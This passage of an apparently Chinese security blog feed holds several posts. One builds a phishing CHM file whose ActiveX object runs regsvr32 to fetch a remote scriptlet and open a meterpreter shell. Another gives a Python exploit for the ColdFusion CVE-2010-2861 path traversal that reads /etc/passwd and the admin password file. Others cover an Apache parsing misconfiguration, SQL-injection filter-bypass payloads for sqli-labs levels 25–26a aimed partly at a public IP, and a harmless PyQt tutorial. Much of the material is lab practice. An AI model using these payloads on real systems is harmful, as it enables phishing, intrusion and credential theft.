      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天早上看到一个chm钓鱼的恶意事件，一时之间感觉蛮有趣。然后上google操作了一波发现不少这种操作。后面随手打开撸了一波，这里做个笔记<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181212/58c5b28e07dc4395998e1d3a47f376f5.jpeg" alt="58c5b28e07dc4395998e1d3a47f376f5.jpeg"></p><p>资料来源：<br><a href="https://wooyun.js.org/drops/%E9%AB%98%E7%BA%A7%E7%BB%84%E5%90%88%E6%8A%80%E6%89%93%E9%80%A0%E2%80%9C%E5%AE%8C%E7%BE%8E%E2%80%9D%20%E6%8D%86%E7%BB%91%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">高级组合技打造“完美” 捆绑后门 - Evi1cg</a></p><p><a href="http://www.mottoin.com/tech/113429.html" target="_blank" rel="noopener">CHM钓鱼 | MottoIN</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先下载Easy CHM<br><img src="https://s2.ax1x.com/2019/01/27/kucCzd.png" alt="kucCzd.png"></p><p>然后创建一个文件夹然后里面放一个html， 和几个文件夹<br><img src="https://s2.ax1x.com/2019/01/27/kucmFS.png" alt="kucmFS.png"></p><p>calc弹弹弹测试，将以下html写入</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&#39;,calc.exe&#39;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>然后进行编译，在打开编译后的chm会发现能弹出一个calc<br><img src="https://s2.ax1x.com/2019/01/27/kucJoT.png" alt="kucJoT.png"></p><p><img src="https://s2.ax1x.com/2019/01/27/kuc8e0.md.png" alt="kuc8e0.md.png"></p><p><b>meterpreter反弹测试</b><br>是否会被杀软拦截：是<br>这里我使用venom生成payload<br>项目地址：<a href="https://github.com/r00t-3xp10it/venom" target="_blank" rel="noopener">GitHub - r00t-3xp10it/venom: venom (metasploit) shellcode generator/compiler/listener</a><br>选择好powershell的选项的payload获取exp，然后在攻击机新建一个fanvcio.ico写入如下：</p><p><img src="https://s2.ax1x.com/2019/01/27/kuc4OI.md.png" alt="kuc4OI.md.png"></p><pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration    progid=&quot;ShortJSRAT&quot;    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;    &lt;!-- Learn from Casey Smith @subTee --&gt;    &lt;script language=&quot;JScript&quot;&gt;        &lt;![CDATA[            ps1  = &quot;你的exp&quot;;            $shell=new ActiveXObject(&quot;WScript.Shell&quot;)            $shell.Run(ps1,0,true);        ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/01/27/kucWSH.md.png" alt="kucWSH.md.png"><br>然后在html写入如下</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&#39;,regsvr32.exe,/u /n /s /i:http://IP/favicon.ico scrobj.dll&#39;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>然后在用Easy CHM编译，在打开编译后的chm就能获取到一个meterpreter<br><img src="https://s2.ax1x.com/2019/01/27/kucbtS.png" alt="kucbtS.png"></p><p><img src="https://s2.ax1x.com/2019/01/27/kucvXn.png" alt="kucvXn.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2010-2861 recurrent</title>
      <link href="/posts/81167905.html"/>
      <url>/posts/81167905.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。<br><img src="http://i1.hdslb.com/bfs/archive/4d62985cf8d97cf16775552450e995f622ac543c.jpg" alt="4d62985cf8d97cf16775552450e995f622ac543c.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>从<a href="https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a>下载好docker环境找到对应的CVE环境然后执行</p><pre><code>docker-compose up -d</code></pre><p>之后访问</p><pre><code>http://127.0.0.1:8500/</code></pre><p>看到以下：<br><img src="https://s2.ax1x.com/2019/01/26/kuEBb4.png" alt="kuEBb4.png"></p><p>直接访问</p><pre><code>读取/etc/passwd :http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en读取管理员密码：&lt;http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code></pre><p>即可读取文件</p><p>简单的漏洞检测脚本</p><pre><code>&#39;&#39;&#39;&#39;author:九世time:2019/1/26source:https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/&#39;&#39;&#39;import requestsimport redef exploit(url):    payload=&#39;/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en&#39;    guanjianzi=&#39;/bin/bash&#39;    payload2=&#39;/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en&#39;    urls=str(url).rstrip(&#39;/&#39;).strip()+payload    urls2=str(url).rstrip(&#39;/&#39;).strip()+payload2    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#39;}    try:        rqt=requests.get(url=urls,headers=headers,timeout=10)        if guanjianzi in rqt.text:            id=1            print(&#39;[+] Found CVE-2010-2861&#39;)        else:            id=0            print(&#39;[-] Not Found CVE-2018-2861&#39;)        uuid=id        if uuid&gt;0:            rqs=requests.get(url=urls2,headers=headers,timeout=10)            passwd=re.findall(&#39;password=[0-9-A-Z].*&#39;,rqs.text)            print(&#39;[+] administrator password:{}&#39;.format(passwd[0]))    except Exception as r:        print(&#39;[!] Error {}&#39;.format(r))</code></pre><p><img src="https://s2.ax1x.com/2019/01/26/kuVBSP.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/01/26/kuEHPI.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/01/26/kuVRFs.png" alt="kuVRFs.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Apache parsing vulnerability</title>
      <link href="/posts/112bbe18.html"/>
      <url>/posts/112bbe18.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>apache由于本身的多特性，造就了他不同的功能。但是如果管理员在对apache的配置设置错误的情况下将造成，解析漏洞。<br><img src="http://p3.pstatp.com/large/pgc-image/152514651210377bf79f316" alt="152514651210377bf79f316"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>一般文件上传漏洞使用白名单的话一般没什么问题。但是如果由于目标使用的web容器配置错误那么就会造成解析漏洞，让攻击者有机可乘。</p><p>Apache如果在配置文件下面加了如下的配置就会造成解析漏洞：</p><pre><code>AddHandler application/x-httpd-php .php</code></pre><p>加入了这个配置之后，上传一个名为xx.php.jpg的文件。访问后会直接进行解析：<br><img src="https://s2.ax1x.com/2019/01/26/kn8xRe.md.png" alt="kn8xRe.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 25-sqli-labs Less 26a</title>
      <link href="/posts/3c935757.html"/>
      <url>/posts/3c935757.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从sqli-labs25关撸到了26a，这机关撸的我心态爆炸。真的恐怖如斯斗气化马<br><img src="http://gogonews.cc/article/img/2018/07/13/cZA1vO3t6f0dOM5/6Yc87k158En6.jpg" alt="6Yc87k158En6.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>fofa找的练习环境：<a href="http://118.24.125.87:8000" target="_blank" rel="noopener">SQL Injections</a><br>windows环境和Linux有不同的方法，由于有些可以代替空格的url编码在windows的Apache不启作用。这里我用Linux做环境，当然你也可以去fofa找在线的。</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-25 Trick with OR &amp; AND&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])){    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    //fiddling with comments    $id= blacklist($id); /*黑名单里面过滤了and和or*/    //echo &quot;&lt;br&gt;&quot;;    //echo $id;    //echo &quot;&lt;br&gt;&quot;;    $hint=$id;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}else {     echo &quot;Please input the ID as parameter with numeric value&quot;;}function blacklist($id){    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)    $id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)    return $id;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-25.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-25-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>从审计第25关的代码可以看到，过滤了and和or，但是正则只对and和or替换为空。只要把过滤的进行双写即可绕过过滤。<br>(只要想办法被他过滤后还能拼接出被过滤的词就ok了)</p><p><b>第25关</b></p><pre><code>anandd oorr</code></pre><p><img src="https://s2.ax1x.com/2019/01/25/kevJAg.md.png" alt="kevJAg.md.png"></p><p>实际测试</p><pre><code>‘ anandd 1=1 --+</code></pre><p><img src="https://s2.ax1x.com/2019/01/25/kevwj0.png" alt="kevwj0.png"></p><p>报错注入</p><pre><code>&#39; anandd updatexml(1,concat(0x7e,(select user()),0x7e),1) --+</code></pre><p><img src="https://s2.ax1x.com/2019/01/25/kevR3R.md.png" alt="kevR3R.md.png"></p><p>这里要注意一点：</p><pre><code>注入的时候information里面的or记得双写，我纠结了半天。。我以为我打错了。。我丢</code></pre><p><b>第25a关</b><br>审计代码先</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-25a Trick with OR &amp; AND Blind&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:60px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variablesif(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);    //fiddling with comments    $id= blacklist($id); /*过滤不变*/    //echo &quot;&lt;br&gt;&quot;;    //echo $id;    //echo &quot;&lt;br&gt;&quot;;    $hint=$id;// connectivity $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;  /*查询方式变了*/$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        //echo &#39;YOU ARE IN ........&#39;;                  echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;;        //echo &#39;You are in...........&#39;;        //print_r(mysql_error()); /*关闭了输入mysql的报错*/        //echo &quot;You have an error in your SQL syntax&quot;;        echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;            echo &#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;;        }}    else {     echo &quot;Please input the ID as parameter with numeric value&quot;;}function blacklist($id){    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)    $id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)    return $id;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-25a.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-25a-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>由于25a把输出mysql错误的语句关闭了，所以我们只能盲注了</p><pre><code>%20anandd%20sleep(if((length(database())=8),1,4))</code></pre><p><img src="https://s2.ax1x.com/2019/01/25/kexfiQ.md.png" alt="kexfiQ.md.png"></p><p><b>第26关</b><br>审计代码</p><pre><code> &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-26 Trick with comments&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])) /*判断GET请求变量ID是否存在*/{    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;); /*写入日志*/    fclose($fp);    //fiddling with comments    $id= blacklist($id); /*黑名单替换，返回的id*/    //echo &quot;&lt;br&gt;&quot;;    //echo $id;    //echo &quot;&lt;br&gt;&quot;;    $hint=$id;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}function blacklist($id){    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        //Strip out spaces    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        //Strip out slashes    return $id;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-26.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-26-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>可以看到很这里过滤的很严格，and,or,/,/*,/s,#,– 全给你过滤掉了<br>代替空格的办法有很多，这里我用%a0代替。代替空格的方法自行google,至于过滤了and和or一样双写带走，然后闭合就手动闭合。</p><pre><code>&#39;%a0anandd%a01=1%a0anandd%a0&#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/01/25/kezFoD.md.png" alt="kezFoD.md.png"></p><p>那么报错注入，常规操作</p><pre><code>&#39;%a0anandd%a0updatexml(1,concat(0x7e,(select%a0user()),0x7e),1)%a0anandd%a0&#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/01/25/kezQw8.md.png" alt="kezQw8.md.png"></p><p><b>第26a关</b><br>这关就更加恶心了，闭合简直能tm上天</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-26a Trick with comments&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])){    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    //fiddling with comments    $id= blacklist($id);    //echo &quot;&lt;br&gt;&quot;;    //echo $id;    //echo &quot;&lt;br&gt;&quot;;    $hint=$id;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;; /*查询方式变了*/    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        //print_r(mysql_error()); /*报错输出注释了*/        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}function blacklist($id){    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        //Strip out spaces    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        //Strip out spaces    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        //Strip out slashes    return $id;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-26-a.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-26a-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>闭合很恶心好吧,过滤不变要求我们盲注</p><pre><code>%27)%a0anandd%a0sleep(if((1=1),1,4))%a0anandd%a0(%271%27)=(%271</code></pre><p><img src="https://s2.ax1x.com/2019/01/25/kmSkn0.md.png" alt="kmSkn0.md.png"><br>跑列名</p><pre><code>http://118.24.125.87:8000/Less-26a/?id=1%27)%a0anandd%a0sleep(if((3=(select%a0count(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=%22users%22)),1,4))%a0anandd%a0(%271%27)=(%271</code></pre><p><img src="https://s2.ax1x.com/2019/01/25/kmSJAO.md.png" alt="kmSJAO.md.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当我们现实遇见有过滤有waf的时候可以尝试这么一波</p><pre><code>1.先判断他过滤了那个词2.能不能用双写绕过？3.能不能用对应词语代替？4.空格过滤了？使用环境能够解析的对应的url编码5.万物皆可fuzz</code></pre><p>fuzz空格得到那个url编码可用：<a href="https://www.jianshu.com/p/ff72f2c6d99c" target="_blank" rel="noopener">Sqli-Labs：Less 26 - Less 26a - 简书</a><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pyqt toss diary</title>
      <link href="/posts/8131316.html"/>
      <url>/posts/8131316.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>折腾了一个晚上的pyqt，突然发现好几把复杂。先做个记录防止忘记<br><img src="http://i0.hdslb.com/bfs/archive/8fc992f1eb4eed9d56acb87ab52eb825c070c3ce.jpg" alt="8fc992f1eb4eed9d56acb87ab52eb825c070c3ce.jpg"></p><h2 id="pyqt笔记第一篇"><a href="#pyqt笔记第一篇" class="headerlink" title="pyqt笔记第一篇"></a>pyqt笔记第一篇</h2><p>原文地址：<a href="https://maicss.gitbooks.io/pyqt5/content/hello_world.html" target="_blank" rel="noopener">Hello World · PyQt5 中文教程</a></p><p><b>安装过程</b>：</p><pre><code>pip install SIPpip install PyQt5pip install wheel</code></pre><p>下载QTCreator：<a href="http://download.qt.io/official_releases/qtcreator/" target="_blank" rel="noopener">Index of /official_releases/qtcreator</a><br>下载Pyqt5：<a href="https://sourceforge.net/projects/pyqt/files/PyQt5/" target="_blank" rel="noopener">PyQt - Browse /PyQt5 at SourceForge.net</a></p><p><b>pycharm配置ui转py的第三方工具</b><br><img src="https://s2.ax1x.com/2019/01/24/kVqI2T.png" alt="kVqI2T.png"></p><pre><code>Name填：工具名称Description填：工具说明Program填：python路径Arguments:填：-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.pyWorking directory填：存放UI的目录</code></pre><p><img src="https://s2.ax1x.com/2019/01/24/kVL9MD.png" alt="kVL9MD.png"></p><p><b>ui转py</b><br><img src="https://s2.ax1x.com/2019/01/24/kVLgSK.md.png" alt="kVLgSK.md.png"><br>配置好后右键pyuic即可转换</p><p><img src="https://s2.ax1x.com/2019/01/24/kVL5TA.md.png" alt="kVL5TA.md.png"></p><p><b>窗口设置</b></p><pre><code>import sysfrom PyQt5.QtWidgets import QWidget,QApplicationclass Demo(QWidget):    def __init__(self):        super().__init__()        self.intui()    def intui(self):        self.resize(350,250) #设置宽度和高度        self.move(300,500) #设置屏幕出现的位置        self.setWindowTitle(&quot;我应该去死&quot;) #设置标题        self.show() #显示窗体if __name__ == &#39;__main__&#39;:    app=QApplication(sys.argv)    obj=Demo()    sys.exit(app.exec_())</code></pre><p><img src="https://s2.ax1x.com/2019/01/24/kVOUht.png" alt=""></p><p>使用setGemoetry()函数来代替resize()和move的，是resize和move的集合体</p><pre><code>import sysfrom PyQt5.QtWidgets import QWidget,QApplicationclass Demo(QWidget):    def __init__(self):        super().__init__()        self.intui()    def intui(self):        self.setGeometry(300,300,300,300)        self.setWindowTitle(&quot;我应该去死&quot;)        self.show()if __name__ == &#39;__main__&#39;:    app=QApplication(sys.argv)    obj=Demo()    sys.exit(app.exec_())</code></pre><p><img src="https://s2.ax1x.com/2019/01/24/kZPPUO.png" alt=""></p><p><b>提示框和按钮</b></p><pre><code>import sysfrom PyQt5.QtWidgets import QWidget,QApplication,QPushButton,QToolTipfrom PyQt5.QtGui import QFontfrom PyQt5.QtCore import QCoreApplicationclass Demo(QWidget):    def __init__(self):        super().__init__()        self.intui()    def intui(self):        QToolTip.setFont(QFont(&#39;SansSerif&#39;,10)) #设置字体和大小        btn=QPushButton(&quot;提交&quot;,self) #设置按钮名称和出现在那个窗口        btn.resize(btn.sizeHint()) #设置窗口大小，btn.sizeHint()为默认大小        btn.setToolTip(&quot;你是想&lt;b&gt;拔刀&lt;/b&gt;吗？&quot;) #按钮提示框        btn.move(102,102) #按钮出现的位置        self.setGeometry(300,300,300,300) #设置窗体出现的位置和高度宽度        self.setWindowTitle(&quot;源氏&quot;)        self.show() #窗体出现        